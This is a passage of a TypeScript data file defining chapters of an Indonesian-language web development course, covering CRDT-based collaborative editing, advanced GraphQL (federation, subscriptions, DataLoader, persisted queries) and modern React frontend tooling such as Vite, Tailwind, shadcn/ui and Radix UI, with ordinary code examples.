    aiPrompt: "Setup Supabase realtime subscription untuk satu table.",
    reflection: "Bedanya real-time database dan event streaming?",
  },
  {
    id: "14.4",
    moduleId: 14,
    chapterNum: "14.4",
    title: "Collaborative Editing",
    subtitle: "Multi-user editing seperti Google Docs",
    level: "Lanjut",
    objectives: ["Memahami collaborative editing", "Mengetahui CRDT dan OT"],
    analogy: { diagram: "Collaborative Editing = Rapat\nBanyak orang edit dokumen sama\n\nConflict = Debat\nHarus ada aturan untuk resolve", caption: "Collaborative editing memungkinkan multi-user edit dokumen secara simultan" },
    explanation: "**Collaborative Editing** memungkinkan banyak user mengedit dokumen secara simultan. Setiap perubahan terlihat oleh semua user secara real-time.\n\n**Dua approach utama:**\n\n1. **OT (Operational Transformation).** Transformasi operasi untuk menghindari conflict. Google Docs pakai ini. Kompleks untuk implementasi.\n2. **CRDT (Conflict-free Replicated Data Type).** Data structure yang otomatis resolve conflict. Lebih simpel dan reliable.\n\n**CRDT cara kerja:**\n\nSetiap character punya unique ID dan timestamp. Kalau dua user edit simultaneously, CRDT merge berdasarkan ID dan timestamp. Tidak perlu central server untuk coordination.\n\n**Library collaborative editing:**\n\n- **Yjs.** CRDT library paling populer untuk JavaScript.\n- **Automerge.** CRDT dengan JSON-like API.\n- **ProseMirror.** Rich text editor dengan collaborative support.\n- **Quill + Yjs.** Quill editor dengan Yjs untuk collaborative.\n\n**Latency compensation:**\n\nLocal changes di-apply immediately (optimistic UI). Remote changes di-merge via CRDT. User selalu melihat response instan.",
    codeExample: { language: "typescript", code: "// YJS COLLABORATIVE EDITING\nimport * as Y from 'yjs';\nimport { WebsocketProvider } from 'y-websocket';\n\nconst doc = new Y.Doc();\nconst yText = doc.getText('content');\n\n// Connect ke sync server\nconst provider = new WebsocketProvider(\n  'wss://demo.yjs.dev',\n  'room-name',\n  doc\n);\n\n// Local change → otomatis sync ke semua peer\nyText.insert(0, 'Hello collaborative world!');\n\n// Listen remote changes\nyText.observe(() => {\n  console.log('Content:', yText.toString());\n});" },
    explainAlong: "Yjs CRDT sync otomatis via WebSocket. Local change optimistic, remote merge via CRDT. Tidak perlu conflict resolution manual.",
    aiPrompt: "Implementasikan collaborative text editor dengan Yjs.",
    reflection: "Kenapa CRDT lebih baik dari OT untuk collaborative editing?",
  }
];



// ============================================================
// MODUL 15: GRAPHQL ADVANCED (4 chapters)
// ============================================================

const modul15: Chapter[] = [
  {
    id: "15.1", moduleId: 15, chapterNum: "15.1",
    title: "Apollo Federation", subtitle: "Microservices GraphQL dengan federation", level: "Lanjut",
    objectives: ["Memahami Apollo Federation", "Bisa membuat federated GraphQL schema"],
    analogy: { diagram: "Monolith API = 1 Restoran dengan 1 Menu Besar\nFederation = Food Court dengan banyak tenant\nTiap tenant punya menu sendiri tapi ada 1 gateway bersama", caption: "Apollo Federation memungkinkan tiap microservices punya GraphQL schema sendiri" },
    explanation: "**Apollo Federation** memungkinkan multiple GraphQL services (subgraphs) digabung menjadi satu schema unified (supergraph). Tiap tim mengelola subgraph sendiri tapi client hanya lihat 1 endpoint.\n\n**Arsitektur Federation:**\n1. **Subgraph** — Tiap microservices punya GraphQL schema sendiri. Punya directive @key untuk entity.\n2. **Router/Gateway** — Menerima query, memecah ke subgraph yang relevan, menggabungkan hasil.\n3. **Supergraph** — Schema gabungan dari semua subgraph.\n\n**Directive Penting:**\n- `@key(fields: \"id\")` — Tandai entity yang bisa direferensi subgraph lain.\n- `@external` — Field dari subgraph lain.\n- `@requires` — Field yang dibutuhkan untuk resolver.",
    codeExample: { language: "graphql", code: "// USER SUBGRAPH\ntype User @key(fields: \"id\") {\n  id: ID!\n  name: String!\n  email: String!\n}\n\n// ORDER SUBGRAPH\ntype Order {\n  id: ID!\n  userId: ID!\n  total: Float!\n}\n\n// EXTEND USER DI ORDER SUBGRAPH\ntype User @key(fields: \"id\") {\n  id: ID! @external\n  orders: [Order]\n}\n\n// GATEWAY COMPOSITION\nconst gateway = new ApolloGateway({\n  supergraphSdl: readFileSync('./supergraph.graphql').toString()\n});" },
    explainAlong: "Tiap subgraph schema sendiri. @key tentukan entity. Gateway gabungkan semua.",
    aiPrompt: "Jelaskan konsep Apollo Federation dan bedanya dengan schema stitching.",
    reflection: "Buat 2 subgraph dengan Apollo Federation. Compose dengan gateway.",
  },
  {
    id: "15.2", moduleId: 15, chapterNum: "15.2",
    title: "GraphQL Subscriptions & Real-time", subtitle: "Real-time updates dengan WebSocket", level: "Lanjut",
    objectives: ["Memahami GraphQL subscriptions", "Bisa implementasi real-time GraphQL"],
    analogy: { diagram: "REST Polling = Cek inbox setiap 5 menit\nSubscription = Notifikasi langsung ke HP saat email masuk", caption: "Subscription memberikan update real-time tanpa polling" },
    explanation: "**GraphQL Subscriptions** memungkinkan client menerima real-time updates saat data berubah di server. Berbeda dari query dan mutation yang request-response, subscriptions menggunakan WebSocket untuk maintain connection persistent.\n\n**Cara Kerja:**\n1. Client subscribe ke event dengan GraphQL subscription document.\n2. Server maintain WebSocket connection.\n3. Saat event terjadi, server push data ke client via WebSocket.\n4. Client menerima update tanpa perlu polling.\n\n**Use Cases:**\n- Chat messages\n- Live notifications\n- Real-time dashboards\n- Collaborative editing\n\n**Implementasi:** Apollo Server menggunakan `PubSub` untuk publish events, lalu subscriptions resolver listen ke events tersebut.",
    codeExample: { language: "graphql", code: "// SCHEMA\ntype Subscription {\n  newMessage(chatId: ID!): Message\n  userTyping(chatId: ID!): User\n}\n\n// RESOLVER\nconst resolvers = {\n  Subscription: {\n    newMessage: {\n      subscribe: (_, { chatId }) => pubsub.asyncIterator(`MESSAGE_${chatId}`)\n    }\n  }\n};\n\n// PUBLISH EVENT\nawait pubsub.publish(`MESSAGE_${chatId}`, {\n  newMessage: message\n});\n\n// CLIENT\nconst { data } = useSubscription(gql`\n  subscription OnNewMessage($chatId: ID!) {\n    newMessage(chatId: $chatId) { id, content, sender }\n  }\n`, { variables: { chatId } });" },
    explainAlong: "Subscription pakai WebSocket. PubSub publish event, resolver listen.",
    aiPrompt: "Jelaskan bedanya polling, long-polling, dan GraphQL subscription.",
    reflection: "Implementasi chat real-time dengan GraphQL subscriptions.",
  },
  {
    id: "15.3", moduleId: 15, chapterNum: "15.3",
    title: "DataLoader & N+1 Problem", subtitle: "Solusi untuk N+1 query problem", level: "Lanjut",
    objectives: ["Memahami N+1 problem", "Bisa menggunakan DataLoader untuk batching"],
    analogy: { diagram: "N+1 Problem = Tanya 1 guru, kemudian tanya tiap murid satu per satu\nDataLoader = Tanya 1 guru, dapatkan semua murid sekaligus", caption: "DataLoader melakukan batching dan caching untuk menghindari N+1 query" },
    explanation: "**N+1 Problem** adalah masalah performa umum di GraphQL. Client request daftar item, resolver item butuh data relasi. Tanpa optimasi, tiap item trigger 1 query database — total 1 + N query.\n\n**Contoh N+1:**\nQuery: `{ authors { name books { title } } }`\nTanpa DataLoader: 1 query authors + N query books (satu per author).\nDengan DataLoader: 1 query authors + 1 query books (batch).\n\n**DataLoader** dari Facebook melakukan dua hal:\n1. **Batching** — Kumpulkan load request dalam 1 tick event loop, eksekusi sebagai single batch.\n2. **Caching** — Hasil load di-cache per-request, data yang sama tidak di-load ulang.\n\n**Best Practice:** Buat 1 DataLoader instance per-request. DataLoader function menerima array keys, return array values dalam urutan yang sama.",
    codeExample: { language: "typescript", code: "// DATALOADER SETUP\nimport DataLoader from 'dataloader';\n\nconst userLoader = new DataLoader(async (userIds) => {\n  // SINGLE QUERY untuk semua ID\n  const users = await db.users.findMany({\n    where: { id: { in: userIds } }\n  });\n  \n  // RETURN DALAM URUTAN userIds\n  return userIds.map(id => users.find(u => u.id === id));\n});\n\n// RESOLVER\nconst resolvers = {\n  Order: {\n    user: async (order) => {\n      return userLoader.load(order.userId);  // batch + cache\n    }\n  }\n};\n\n// CREATE PER REQUEST\napp.use((req, res, next) => {\n  req.loaders = {\n    user: new DataLoader(batchUsers),\n    order: new DataLoader(batchOrders)\n  };\n  next();\n});" },
    explainAlong: "DataLoader batch request jadi single query. Cache per-request.",
    aiPrompt: "Apa itu N+1 problem dan bagaimana DataLoader menyelesaikannya?",
    reflection: "Implementasi DataLoader untuk entity User dan Order.",
  },
  {
    id: "15.4", moduleId: 15, chapterNum: "15.4",
    title: "Persisted Queries & Custom Directives", subtitle: "Optimasi dan ekstensi schema", level: "Lanjut",
    objectives: ["Memahami persisted queries", "Bisa membuat custom directive"],
    analogy: { diagram: "Persisted Query = Tiket Konser (singkat, terdaftar)\nCustom Directive = Stempel Khusus (modifikasi perilaku)", caption: "Persisted queries mengganti query string dengan hash untuk keamanan dan performa" },
    explanation: "**Persisted Queries** — Client tidak kirim query string lengkap, hanya kirim hash (SHA-256) dari query yang sudah didaftarkan sebelumnya. Keuntungan:\n\n1. **Keamanan** — Server hanya eksekusi query yang sudah di-allowlist.\n2. **Performa** — Request body jauh lebih kecil (hanya hash + variables).\n3. **Caching** — CDN bisa cache GraphQL response berdasarkan hash.\n\n**Custom Directives** — Ekstensi schema untuk modifikasi perilaku. Apollo mendukung schema directives untuk transformasi programmatic.\n\n**Contoh Custom Directive:**\n`@auth` directive — require authentication untuk field.\n`@rateLimit` — batasi request rate per field.\n`@cacheControl` — tentukan cache TTL per field.",
    codeExample: { language: "typescript", code: "// PERSISTED QUERIES\n// 1. Client generate hash dari query\nconst hash = sha256(queryString);\n\n// 2. Client kirim hash saja\nfetch('/graphql', {\n  method: 'POST',\n  body: JSON.stringify({\n    extensions: {\n      persistedQuery: {\n        version: 1,\n        sha256Hash: hash\n      }\n    }\n  })\n});\n\n// CUSTOM DIRECTIVE: @auth\nconst authDirective = (directiveName) => ({\n  authDirectiveTypeDefs: `directive @${directiveName} on FIELD_DEFINITION`,\n  authDirectiveTransformer: (schema) =>\n    mapSchema(schema, {\n      [MapperKind.OBJECT_FIELD]: (fieldConfig) => {\n        const directive = getDirective(schema, fieldConfig, directiveName);\n        if (directive) {\n          const { resolve = defaultFieldResolver } = fieldConfig;\n          fieldConfig.resolve = (source, args, context, info) => {\n            if (!context.user) throw new Error('Unauthorized');\n            return resolve(source, args, context, info);\n          };\n        }\n        return fieldConfig;\n      }\n    })\n});" },
    explainAlong: "Persisted query kirim hash, bukan query string. Custom directive ubah resolver.",
    aiPrompt: "Jelaskan keuntungan persisted queries dibanding query string biasa.",
    reflection: "Buat custom directive @auth yang require authentication.",
  }
];

// ============================================================
// MODUL 16: FRONTEND MODERN (18 chapters)
// ============================================================

const modul16: Chapter[] = [
  {
    id: "16.1", moduleId: 16, chapterNum: "16.1",
    title: "React Fundamentals", subtitle: "Component, Props, dan State", level: "Menengah",
    objectives: ["Memahami konsep React component", "Bisa menggunakan props dan state"],
    analogy: { diagram: "React Component = LEGO Block\n\n[App] = [Header] + [Sidebar] + [Main] + [Footer]\n         (komponen reusable)", caption: "React dibangun dari komponen reusable yang independen" },
    explanation: "**React** adalah library JavaScript untuk membangun user interface berbasis komponen. Komponen adalah fungsi JavaScript yang return JSX — syntax yang mirip HTML tapi berjalan di JavaScript.\n\n**Tiga Konsep Utama:**\n1. **Component** — Fungsi yang menerima props dan return JSX. Reusable dan composable.\n2. **Props** — Data yang dikirim parent ke child. Read-only, tidak boleh dimodifikasi child.\n3. **State** — Data internal component yang bisa berubah. Perubahan state memicu re-render.\n\n**JSX Rules:**\n- Return single parent element (gunakan fragment <>...</> jika perlu).\n- Class menjadi className, for menjadi htmlFor.\n- JavaScript expression pakai curly braces { }.\n- Semua tag harus ditutup (termasuk self-closing seperti <img />).",
    codeExample: { language: "tsx", code: "// FUNCTIONAL COMPONENT\nfunction Welcome({ name, age }) {\n  return (\n    <div className=\"card\">\n      <h1>Hello, {name}!</h1>\n      <p>You are {age} years old.</p>\n    </div>\n  );\n}\n\n// COMPONENT DENGAN STATE\nimport { useState } from 'react';\n\nfunction Counter() {\n  const [count, setCount] = useState(0);\n  \n  return (\n    <div>\n      <p>Count: {count}</p>\n      <button onClick={() => setCount(count + 1)}>Increment</button>\n    </div>\n  );\n}\n\n// COMPOSITION\nfunction App() {\n  return (\n    <div>\n      <Welcome name=\"Alice\" age={25} />\n      <Welcome name=\"Bob\" age={30} />\n      <Counter />\n    </div>\n  );\n}" },
    explainAlong: "Component = fungsi dengan props. useState = hook untuk state lokal.",
    aiPrompt: "Jelaskan bedanya props dan state di React.",
    reflection: "Buat aplikasi counter dengan React. Tambahkan increment dan decrement.",
  },
  {
    id: "16.2", moduleId: 16, chapterNum: "16.2",
    title: "React Hooks", subtitle: "useEffect, useRef, dan Custom Hooks", level: "Menengah",
    objectives: ["Memahami lifecycle dengan hooks", "Bisa membuat custom hook"],
    analogy: { diagram: "Class Component = Mesin dengan banyak tombol (kompleks)\nHooks = Remote control sederhana — setiap tombol punya 1 fungsi", caption: "Hooks memungkinkan functional component punya state dan lifecycle" },
    explanation: "**Hooks** adalah fungsi yang memungkinkan functional component menggunakan state dan lifecycle features. Hooks diprefix dengan use.\n\n**Hooks Built-in:**\n- `useState` — State lokal component.\n- `useEffect` — Side effects: fetch data, subscribe, DOM manipulation.\n- `useRef` — Referensi mutable yang tidak memicu re-render. Berguna untuk DOM reference dan menyimpan nilai previous.\n- `useContext` — Akses React context tanpa Consumer wrapper.\n- `useMemo` — Cache hasil komputasi.\n- `useCallback` — Cache fungsi callback.\n\n**Rules of Hooks:**\n1. Hanya panggil hooks di top level (bukan di dalam loop/condition).\n2. Hanya panggil hooks dari React functions (component atau custom hooks).\n\n**Custom Hooks** — Ekstrak logic reusable ke fungsi hooks sendiri. Nama harus diawali use.",
    codeExample: { language: "tsx", code: "// USEEFFECT — FETCH DATA\nimport { useState, useEffect } from 'react';\n\nfunction UserList() {\n  const [users, setUsers] = useState([]);\n  const [loading, setLoading] = useState(true);\n  \n  useEffect(() => {\n    fetch('/api/users')\n      .then(r => r.json())\n      .then(data => {\n        setUsers(data);\n        setLoading(false);\n      });\n  }, []); // [] = jalan sekali saat mount\n  \n  if (loading) return <p>Loading...</p>;\n  return <ul>{users.map(u => <li key={u.id}>{u.name}</li>)}</ul>;\n}\n\n// USEREF — DOM REFERENCE\nfunction TextInput() {\n  const inputRef = useRef(null);\n  \n  const focus = () => inputRef.current.focus();\n  \n  return (\n    <div>\n      <input ref={inputRef} type=\"text\" placeholder=\"Type here\" />\n      <button onClick={focus}>Focus Input</button>\n    </div>\n  );\n}\n\n// CUSTOM HOOK\nfunction useLocalStorage(key, initialValue) {\n  const [value, setValue] = useState(() => {\n    const stored = localStorage.getItem(key);\n    return stored ? JSON.parse(stored) : initialValue;\n  });\n  \n  useEffect(() => {\n    localStorage.setItem(key, JSON.stringify(value));\n  }, [key, value]);\n  \n  return [value, setValue];\n}" },
    explainAlong: "useEffect untuk side effects. useRef untuk DOM reference. Custom hook ekstrak logic.",
    aiPrompt: "Jelaskan rules of hooks dan kenapa penting.",
    reflection: "Buat custom hook useFetch untuk fetching data dengan loading dan error state.",
  },
  {
    id: "16.3", moduleId: 16, chapterNum: "16.3",
    title: "Vite: Build Tool Super Cepat", subtitle: "Gantikan Create React App dengan Vite", level: "Menengah",
    objectives: ["Memahami keunggulan Vite", "Bisa setup project React dengan Vite"],
    analogy: { diagram: "CRA (Webpack) = Restoran dengan dapur tradisional\nLama nyala, lama masak\n\nVite = Restoran dengan dapur modern (ESM)\nNyala instan, hot reload kilat", caption: "Vite menggunakan ES Modules untuk development dan Rollup untuk production" },
    explanation: "**Vite** adalah build tool modern yang menggantikan Create React App. Dibuat oleh Evan You (creator Vue.js).\n\n**Keunggulan Vite:**\n1. **Instant Server Start** — Dev server mulai dalam milidetik, tidak perlu bundling.\n2. **Lightning Fast HMR** — Hot Module Replacement hampir instan.\n3. **Optimized Build** — Gunakan Rollup untuk production build yang highly optimized.\n4. **TypeScript Support** — Out of the box, tidak perlu konfigurasi.\n5. **Rich Plugin Ecosystem** — Plugin untuk React, Vue, Svelte, dll.\n\n**Cara Kerja Vite:**\n- **Dev mode:** Menggunakan native ES Modules di browser. Tiap file di-serve langsung tanpa bundle.\n- **Production:** Code di-bundle dengan Rollup untuk optimal loading performance.",
    codeExample: { language: "typescript", code: "# CREATE PROJECT DENGAN VITE\nnpm create vite@latest my-app -- --template react-ts\ncd my-app\nnpm install\nnpm run dev\n\n# VITE CONFIG (vite.config.ts)\nimport { defineConfig } from 'vite';\nimport react from '@vitejs/plugin-react';\n\nexport default defineConfig({\n  plugins: [react()],\n  server: {\n    port: 3000,\n    proxy: {\n      '/api': 'http://localhost:8080'\n    }\n  },\n  build: {\n    outDir: 'dist',\n    sourcemap: true\n  }\n});" },
    explainAlong: "Vite dev server pakai ESM, production pakai Rollup. Config di vite.config.ts.",
    aiPrompt: "Apa keuntungan Vite dibanding webpack?",
    reflection: "Migrate 1 project CRA ke Vite. Bandingkan waktu build dan dev server start.",
  },
  {
    id: "16.4", moduleId: 16, chapterNum: "16.4",
    title: "Tailwind CSS Fundamentals", subtitle: "Utility-first CSS framework", level: "Menengah",
    objectives: ["Memahami konsep utility-first CSS", "Bisa menggunakan Tailwind classes"],
    analogy: { diagram: "Traditional CSS = Memasak dari bahan mentah (potong, tumis, bumbu)\nTailwind = Meal Kit (bahan siap pakai, tinggal ikuti instruksi)", caption: "Tailwind menyediakan utility classes siap pakai untuk styling cepat" },
    explanation: "**Tailwind CSS** adalah framework CSS utility-first. Alih-alih menulis CSS custom, kamu menggunakan class utilitas yang sudah tersedia.\n\n**Keuntungan Tailwind:**\n1. **Rapid Development** — Tidak perlu pikir nama class atau tulis CSS file.\n2. **Consistent Design** — Spacing, color, typography mengikuti design system.\n3. **Small Bundle** — Purge unused styles, hanya ship CSS yang dipakai.\n4. **Responsive** — Prefix `md:`, `lg:`, `xl:` untuk breakpoint.\n5. **Dark Mode** — Built-in dark mode support.\n\n**Cara Kerja:**\nTiap utility class adalah single CSS property. Misalnya: `flex` = `display: flex`, `p-4` = `padding: 1rem`, `text-red-500` = `color: #ef4444`.\n\n**Tailwind menyediakan:** Spacing scale (0-96), Color palette (50-900), Typography (size, weight, family), Layout (flex, grid, box), Effects (shadow, rounded, transition).",
    codeExample: { language: "html", code: "<!-- TAILWIND EXAMPLE -->\n<div className=\"max-w-md mx-auto bg-white rounded-xl shadow-md overflow-hidden md:max-w-2xl\">\n  <div className=\"md:flex\">\n    <div className=\"md:shrink-0\">\n      <img className=\"h-48 w-full object-cover md:h-full md:w-48\"\n           src=\"/img/building.jpg\" alt=\"Building\" />\n    </div>\n    <div className=\"p-8\">\n      <div className=\"uppercase tracking-wide text-sm text-indigo-500 font-semibold\">\n        Company retreats\n      </div>\n      <h2 className=\"block mt-1 text-lg leading-tight font-medium text-black\">\n        Incredible accommodation for your team\n      </h2>\n      <p className=\"mt-2 text-slate-500\">\n        Looking to take your team away on a retreat?\n      </p>\n    </div>\n  </div>\n</div>" },
    explainAlong: "Utility class = 1 CSS property. Responsive prefix md:, lg:.",
    aiPrompt: "Kenapa Tailwind lebih cepat untuk development dibanding CSS tradisional?",
    reflection: "Build card component dengan Tailwind. Gunakan responsive dan hover states.",
  },
  {
    id: "16.5", moduleId: 16, chapterNum: "16.5",
    title: "Tailwind Customization & Design System", subtitle: "Config, tema, dan plugin", level: "Menengah",
    objectives: ["Bisa mengkonfigurasi Tailwind", "Bisa membuat design system dengan Tailwind"],
    analogy: { diagram: "Tailwind Config = Remote TV\nBisa atur warna, spacing, font sesuai keinginan brand", caption: "tailwind.config.js memungkinkan kustomisasi penuh design system" },
    explanation: "**Tailwind Config** memungkinkan kamu mengkustomisasi setiap aspek framework. File `tailwind.config.js` adalah tempat menambahkan custom colors, fonts, spacing, breakpoints, dan lainnya.\n\n**Extending Theme:**\nGunakan `extend` untuk menambahkan value tanpa override default. Ini penting agar utility classes bawaan Tailwind tetap tersedia.\n\n**Custom Plugin:**\nBuat plugin sendiri untuk generate utility classes yang spesifik ke projectmu.\n\n**@apply Directive:**\nGunakan `@apply` untuk mengekstrak utility classes ke CSS class custom saat diperlukan (misal untuk styling third-party components).\n\n**Design Tokens:**\nDefinisikan design tokens (colors, spacing, typography) di config, konsisten di seluruh aplikasi.",
    codeExample: { language: "typescript", code: "// tailwind.config.ts\nimport type { Config } from 'tailwindcss';\n\nconst config: Config = {\n  content: ['./index.html', './src/**/*.{ts,tsx}'],\n  theme: {\n    extend: {\n      colors: {\n        brand: {\n          50: '#eff6ff',\n          500: '#3b82f6',\n          900: '#1e3a5f',\n        }\n      },\n      fontFamily: {\n        sans: ['Inter', 'system-ui', 'sans-serif'],\n      },\n      spacing: {\n        '128': '32rem',\n      }\n    }\n  },\n  plugins: [\n    require('@tailwindcss/forms'),\n    require('@tailwindcss/typography')\n  ]\n};\n\nexport default config;\n\n// @apply EXAMPLE\n/* styles.css */\n.btn-primary {\n  @apply px-4 py-2 bg-brand-500 text-white rounded-lg\n         hover:bg-brand-900 transition-colors;\n}" },
    explainAlong: "extend untuk tambah value tanpa override default. @apply ekstrak utility ke CSS class.",
    aiPrompt: "Bagaimana cara menambahkan custom color di Tailwind?",
    reflection: "Setup Tailwind config dengan custom colors, fonts, dan spacing untuk brand-mu.",
  },
  {
    id: "16.6", moduleId: 16, chapterNum: "16.6",
    title: "shadcn/ui: Komponen yang Customizable", subtitle: "Copy-paste components, bukan install library", level: "Menengah",
    objectives: ["Memahami filosofi shadcn/ui", "Bisa menggunakan komponen shadcn/ui"],
    analogy: { diagram: "UI Library = Apartemen sewa (terbatas modifikasi)\nshadcn/ui = Rumah yang bisa direnovasi sepenuhnya", caption: "shadcn/ui menyediakan komponen yang bisa di-copy dan modifikasi sepenuhnya" },
    explanation: "**shadcn/ui** adalah koleksi reusable components yang bisa di-copy langsung ke project. Berbeda dari library UI seperti MUI atau Chakra, shadcn/ui tidak di-install sebagai dependency — code komponen ada di codebase-mu.\n\n**Filosofi:**\n1. **Copy, don't install** — Code komponen ada di project, bukan di node_modules.\n2. **Fully customizable** — Modifikasi styling dan behavior sesuai kebutuhan.\n3. **Built on Radix UI** — Primitives aksesibel sebagai fondasi.\n4. **Tailwind CSS** — Styling dengan utility classes.\n5. **TypeScript** — Fully typed out of the box.\n\n**Cara Install Komponen:**\nnpx shadcn add button\nnpx shadcn add dialog card tabs\n\nKomponen akan di-copy ke folder `components/ui/` di project. Kamu bisa edit langsung.",
    codeExample: { language: "tsx", code: "# INSTALL SHADCN/UI\nnpx shadcn-ui@latest init\nnpx shadcn add button\nnpx shadcn add dialog input label\n\n# USAGE\nimport { Button } from '@/components/ui/button';\nimport { Dialog, DialogContent, DialogHeader, DialogTitle }\n  from '@/components/ui/dialog';\nimport { Input } from '@/components/ui/input';\n\nfunction App() {\n  return (\n    <Dialog>\n      <Button variant=\"outline\">Edit Profile</Button>\n      <DialogContent>\n        <DialogHeader>\n          <DialogTitle>Edit Profile</DialogTitle>\n        </DialogHeader>\n        <Input placeholder=\"Your name\" />\n        <Button>Save Changes</Button>\n      </DialogContent>\n    </Dialog>\n  );\n}" },
    explainAlong: "shadcn/ui copy code ke project, bukan install dari npm. Fully customizable.",
    aiPrompt: "Apa bedanya shadcn/ui dan MUI/Chakra UI?",
    reflection: "Install 3 komponen shadcn/ui. Customisasi styling sesuai brand.",
  },
  {
    id: "16.7", moduleId: 16, chapterNum: "16.7",
    title: "Radix UI Primitives", subtitle: "Accessible UI components tanpa styling", level: "Menengah",
    objectives: ["Memahami Radix UI", "Bisa membuat accessible component dengan Radix"],
    analogy: { diagram: "Radix UI = Rangka boneka (struktur + mekanisme)\nKamu yang beri pakaian (styling) dan hiasan", caption: "Radix UI menyediakan unstyled accessible primitives untuk di-styling sendiri" },
    explanation: "**Radix UI** adalah library low-level, unstyled components yang fokus pada accessibility, keyboard navigation, dan behavior. shadcn/ui dibangun di atas Radix UI primitives.\n\n**Kenapa Radix UI?**\n1. **Accessibility** — WAI-ARIA compliant, keyboard navigation, focus management.\n2. **Unstyled** — Tidak ada styling bawaan, bebas styling dengan CSS apapun.\n3. **Controlled & Uncontrolled** — Support kedua mode.\n4. **Composable** — Tiap bagian bisa dikomposisikan secara independen.\n5. **Portal Support** — Dialog, popover otomatis render di body.\n\n**Primitives Tersedia:** Dialog, Dropdown Menu, Tabs, Tooltip, Popover, Select, Checkbox, Radio Group, Switch, Slider, Accordion, Collapsible, Hover Card, Toggle Group, Aspect Ratio, Avatar, Label, Progress, Scroll Area, Separator, Skeleton, Toggle, Toolbar.",
    codeExample: { language: "tsx", code: "import * as Dialog from '@radix-ui/react-dialog';\nimport { Cross2Icon } from '@radix-ui/react-icons';\n\nfunction MyDialog() {\n  return (\n    <Dialog.Root>\n      <Dialog.Trigger asChild>\n        <button>Open Dialog</button>\n      </Dialog.Trigger>\n      <Dialog.Portal>\n        <Dialog.Overlay className=\"fixed inset-0 bg-black/50\" />\n        <Dialog.Content className=\"fixed top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 bg-white p-6 rounded-lg\">\n          <Dialog.Title className=\"text-lg font-bold\">Dialog Title</Dialog.Title>\n          <Dialog.Description>Description here</Dialog.Description>\n          <Dialog.Close asChild>\n            <button className=\"absolute top-2 right-2\">\n              <Cross2Icon />\n            </button>\n          </Dialog.Close>\n        </Dialog.Content>\n      </Dialog.Portal>\n    </Dialog.Root>\n  );\n}" },
    explainAlong: "Radix UI = unstyled primitives. Compose bagian-bagian. Full accessibility.",
    aiPrompt: "Kenapa Radix UI primitives lebih baik dari membuat component dari nol?",
    reflection: "Buat accessible dropdown menu dengan Radix UI + Tailwind.",
  },
  {
    id: "16.8", moduleId: 16, chapterNum: "16.8",
    title: "React Patterns: Compound Components", subtitle: "Pattern untuk komponen yang saling terkait", level: "Menengah–Lanjut",
    objectives: ["Memahami compound components pattern", "Bisa mengimplementasikan compound components"],
    analogy: { diagram: "Compound Components = Set Peralatan Dapur\nTiap alat punya fungsi sendiri tapi bekerja sama untuk masak", caption: "Compound components adalah pattern di mana beberapa component bekerja bersama untuk membentuk satu kesatuan" },
    explanation: "**Compound Components** adalah pattern di mana beberapa component bekerja bersama secara implisit melalui shared state, tanpa perlu props drilling. Contoh klasik: `<Select>` dengan `<Option>`, `<Tabs>` dengan `<Tab>` dan `<TabPanel>`.\n\n**Implementasi dengan React Context:**\n1. Buat context untuk share state antara parent dan children.\n2. Parent component (Container) menjadi Provider.\n3. Child components (Sub-components) consume context.\n\n**Keuntungan:**\n- API yang intuitif dan declarative.\n- Tidak perlu props drilling.\n- Fleksibel — urutan dan nesting bebas.\n- Encapsulated state management.\n\n**Contoh:** `<Tabs>` mengatur active tab state. `<Tab>` dan `<TabPanel>` mengonsumsi context untuk tahu mana yang active.",
    codeExample: { language: "tsx", code: "// COMPOUND COMPONENTS PATTERN\nimport { createContext, useContext, useState } from 'react';\n\nconst TabsContext = createContext(null);\n\nfunction Tabs({ children }) {\n  const [activeTab, setActiveTab] = useState(0);\n  return (\n    <TabsContext.Provider value={{ activeTab, setActiveTab }}>\n      <div className=\"tabs\">{children}</div>\n    </TabsContext.Provider>\n  );\n}\n\nfunction TabList({ children }) {\n  return <div className=\"flex border-b\">{children}</div>;\n}\n\nfunction Tab({ index, children }) {\n  const { activeTab, setActiveTab } = useContext(TabsContext);\n  return (\n    <button\n      className={activeTab === index ? 'border-b-2 border-blue-500' : ''}\n      onClick={() => setActiveTab(index)}\n    >\n      {children}\n    </button>\n  );\n}\n\nfunction TabPanel({ index, children }) {\n  const { activeTab } = useContext(TabsContext);\n  return activeTab === index ? <div className=\"p-4\">{children}</div> : null;\n}\n\nTabs.List = TabList;\nTabs.Tab = Tab;\nTabs.Panel = TabPanel;\n\n// USAGE\n<Tabs>\n  <Tabs.List>\n    <Tabs.Tab index={0}>Account</Tabs.Tab>\n    <Tabs.Tab index={1}>Security</Tabs.Tab>\n  </Tabs.List>\n  <Tabs.Panel index={0}>Account settings here</Tabs.Panel>\n  <Tabs.Panel index={1}>Security settings here</Tabs.Panel>\n</Tabs>" },
    explainAlong: "Compound components share state via Context. API intuitive dan declarative.",
    aiPrompt: "Apa keuntungan compound components dibanding props drilling?",
    reflection: "Implementasi compound components untuk Accordion.",
  },
  {
    id: "16.9", moduleId: 16, chapterNum: "16.9",
    title: "React Patterns: Render Props & HOC", subtitle: "Pattern untuk code reuse", level: "Menengah–Lanjut",
    objectives: ["Memahami render props dan HOC", "Bisa menggunakan kedua pattern"],
    analogy: { diagram: "Render Props = Kirim blueprint (gambar desain)\nHOC = Bungkus kado (tambahkan kemasan di luar)", caption: "Render props dan HOC adalah pattern untuk berbagi logic antar component" },
    explanation: "**Render Props** adalah pattern di mana component menerima fungsi sebagai props yang mengembalikan JSX. Component tersebut memanggil fungsi tersebut dengan data yang dibutuhkan.\n\n**Higher-Order Component (HOC)** adalah fungsi yang menerima component dan mengembalikan component baru dengan behavior tambahan. HOC biasanya diprefix dengan with.\n\n**Perbandingan:**\n- Render Props: Lebih fleksibel, composition lebih jelas.\n- HOC: Lebih bersih untuk enhancement yang umum.\n- **Hooks adalah pengganti modern** untuk banyak kasus render props dan HOC.\n\n**Kapan masih pakai pattern ini?**\n- Render Props: Cross-cutting concerns yang perlu share multiple values.\n- HOC: Library third-party yang belum migrasi ke hooks.",
